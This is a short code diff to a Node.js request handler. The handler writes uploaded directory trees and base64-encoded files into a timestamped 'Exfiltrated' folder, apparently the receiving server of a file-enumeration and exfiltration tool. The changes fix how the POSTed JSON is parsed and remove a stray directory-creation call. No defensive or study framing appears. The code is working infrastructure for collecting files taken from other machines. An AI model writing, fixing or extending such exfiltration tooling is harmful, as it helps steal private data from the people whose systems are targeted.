@@ -14,11 +14,13 @@ const EXFIL_DIR = path.join(`./Exfiltrated`, `${getTimestamp()} enumerator/`).re
 function createFile(fileJSON, dir_path)
 {
     // Loop through all file system elements in the current JSON
-    Object.entries(fileJSON).forEach((jsonEntry) => {
+    // The inputs we get should be arrays
+    fileJSON.forEach((jsonEntry) => {
         
         // fsElObject can either be another JSON Entry representing child directories, or it can be a base64 of the file value
         // fsElName can either be the file or directory name
-        const [fsElName, fsElObject] = jsonEntry;
+        // Our array is filled with JSONs that have 1 key and 1 value
+        const [fsElName, fsElObject] = Object.entries(jsonEntry)[0];
 
         // If we have a directory, mkdir that and then recursively pass it into createFile
         if (Array.isArray(fsElObject))
@@ -73,14 +75,9 @@ module.exports = function(request)
 
     /**
      * @type {JSON}
+     * Remember that everything is wrapped under the Default key
      */
-    let reqJSON = JSON.parse(request.body);
+    let reqJSON = JSON.parse(request.body).Default;
 
     createFile(reqJSON, EXFIL_DIR);
-    
-    // This is going to be pretty similar to what we wrote in ls_read.js, but I want to have multiple POST function files in case
-    // we decide to do something more with this in the future (such as setting custom file limits)
-    fs.mkdirSync(dir_path, {
-        recursive: true
-    });
 }
